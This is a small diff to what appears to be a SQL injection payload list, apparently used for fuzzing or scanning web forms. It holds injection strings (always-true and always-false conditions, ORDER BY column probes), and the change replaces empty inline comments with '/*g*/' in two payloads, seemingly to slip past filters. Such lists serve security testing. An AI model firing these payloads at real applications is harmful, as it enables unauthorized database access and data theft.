@@ -4,5 +4,5 @@ a' and 'fghi'='fghj'-- #
 a' or 'dfth'='dfth'-- #
 a' order by 9999-- #
 a' order by 1-- #
-a'and/**/456=678-- #
-a'or/**/345=345-- #
+a'and/*g*/456=678-- #
+a'or/*g*/345=345-- #
